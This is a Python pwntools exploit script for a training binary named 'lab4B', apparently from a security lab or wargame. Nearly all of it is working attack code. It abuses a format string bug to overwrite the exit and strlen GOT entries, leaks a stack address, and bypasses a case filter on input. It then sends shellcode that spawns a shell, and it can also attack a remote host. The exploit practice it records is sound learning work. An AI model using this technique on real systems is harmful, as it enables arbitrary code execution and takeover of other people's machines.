#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('lab4B')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def parse(data):
    payload = b""
    for i in data:
        if i >= ord('A') and i <= ord('Z'):
            payload += bytes([i ^ 0x20])
        else:
            payload += bytes([i])

    return payload


def solve():

    offset = 6
    write = {
        exe.got["exit"]: exe.sym["main"]
    }
    payload = fmtstr_payload(offset, write, write_size='short')

    io.sendline(parse(payload))

    io.sendline(b"junk!")
    io.sendline(b"%5$p.pew")
    io.recvuntil(b"junk!\n")
    leak = io.recvline().split(b".")[0]
    stack = int(leak, 16) - 0x120 - 0x90
    info("stack: %#x", stack)

    write = {
        exe.got["strlen"]: stack
    }
    payload = fmtstr_payload(offset, write, write_size='short')

    io.sendline(parse(payload))

    io.sendline(asm(shellcraft.sh()))

    io.clean()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

